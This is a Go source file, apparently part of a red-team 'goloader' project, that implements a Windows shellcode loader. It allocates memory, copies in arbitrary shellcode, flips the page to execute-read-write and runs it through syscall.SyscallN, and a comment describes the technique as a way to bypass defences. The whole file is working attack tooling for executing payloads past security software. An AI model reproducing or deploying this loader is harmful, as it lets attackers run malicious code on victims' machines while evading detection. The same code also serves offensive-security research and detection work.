package loaders

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/mszatanik/goloader/pkg/win32"
)

/*
Diirect syscall with PAGE_READWRITE -> PAGE_EXECUTE_READWRITE
as a way to bypass defences

inspiration: https://www.youtube.com/watch?v=gH9qyHVc9-M
*/
func ExecuteShellcodeInLocalProcess(bytes []byte) {
	fmt.Printf("[*] Injecting %d bytes\r\n", len(bytes))

	// VirtualAlloc
	addr, err := win32.VirtualAllocCall(uintptr(0), uintptr(len(bytes)), win32.MEM_COMMIT|win32.MEM_RESERVE, win32.PAGE_READWRITE)
	if err != nil && addr == 0 {
		panic(fmt.Sprintf("[-] VirtualAlloc failed: %s", err))
	}

	// RtlMoveMemory
	err = win32.RtlMoveMemoryCall(addr, (uintptr)(unsafe.Pointer(&bytes[0])), uintptr(len(bytes)))
	if err != nil && err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[-] RtlMoveMemory failed: %s", err))
	}

	// VirtualProtect
	var oldProtect = win32.PAGE_READWRITE
	err = win32.VirtualProtectCall(addr, uintptr(len(bytes)), win32.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		panic(fmt.Sprintf("[-] VirtualProtect failed: %s", err))
	}

	fmt.Println("[*] SyscallN")
	_, _, errSyscall := syscall.SyscallN(addr, 0, 0, 0, 0)
	if errSyscall != 0 {
		panic(fmt.Sprintf("[-] SyscallN failed: %s", err))
	}
}
